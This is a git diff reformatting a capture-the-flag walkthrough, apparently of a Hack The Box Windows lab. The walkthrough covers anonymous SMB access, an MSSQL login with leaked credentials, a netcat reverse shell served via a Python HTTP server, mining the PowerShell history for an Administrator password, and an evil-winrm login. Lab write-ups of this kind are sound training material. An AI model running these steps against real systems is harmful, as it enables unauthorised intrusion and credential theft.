@@ -21,88 +21,118 @@ tags:
 
 
 ![](/img2/Pasted%20image%2020250312171234.png)
+
 ## Introduction
 
 > In this machine, we take advantage of an SMB misconfiguration, exploit an MSSQL database, and escalate privileges through regular expressions in a Windows system.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.95.187
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.95.187
 ```
+
 ![](/img2/Pasted%20image%2020250312171557.png)
 
-3. SMB service enumeration
+- SMB service enumeration
+
 ```bash
 smbclient -L 10.129.95.187 -N
 ```
+
 ![](/img2/Pasted%20image%2020250312171901.png)
 
-4. Get backups content
+- Get backups content
+
 ```bash
 smbclient //10.129.95.187/backups -N
 ```
+
 ![](/img2/Pasted%20image%2020250312172345.png)
+
 ```bash
 cat prod.dtsConfig
 ```
+
 ![](/img2/Pasted%20image%2020250312172525.png)
 
 
 ## Exploitation
 
-1. Connect to MSSQL database
+- Connect to MSSQL database
+
 ```bash
 tsql -H 10.129.95.187 -p 1433 -U "ARCHETYPE\sql_svc" -P "M3g4c0rp123"
 ```
+
 ![](/img2/Pasted%20image%2020250312180107.png)
 
-2. Reverse shell
+- Reverse shell
+
 - Download files and upload in Python HTTP server
+
 ```bash
 python3 -m http.server 8000
 ```
+
 ![](/img2/Pasted%20image%2020250312201446.png)
 
 - Install nc.exe in Windows machine
+
 ![](/img2/Pasted%20image%2020250312184620.png)
 
 - Send reverse shell
+
 ![](/img2/Pasted%20image%2020250312194628.png)
+
 ```bash
 nc -nlvp 9000
 ```
+
 ![](/img2/Pasted%20image%2020250312184828.png)
 
 ## Post-exploitation
 
-1. Get user flag
+- Get user flag
+
 ![](/img2/Pasted%20image%2020250312180914.png)
-2. List all txt files
+
+- List all txt files
+
 ```powershell
 dir -Force -Recurse C:\Users\*.txt 2>$null | sls -Pattern "admin" 2>$null | Select-Object -Unique Path
 ```
+
 ![](/img2/Pasted%20image%2020250312195031.png)
+
 > dir -Force -Recurse * .txt --> List all txt files and directories
+
 > sls -Pattern "admin" --> Search "admin" word 
+
 > select -Unique Path --> Show unique path
 
-3. Open file
+- Open file
+
 ```bash
 cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
+
 ![](/img2/Pasted%20image%2020250312201301.png)
 
-4. Connect with Administrator user
+- Connect with Administrator user
+
 ```bash
 evil-winrm -i 10.129.95.187 -u Administrator -p MEGACORP_4dm1n\!\!
 ```
+
 ![](/img2/Pasted%20image%2020250312202327.png)
 
 ## Tasks
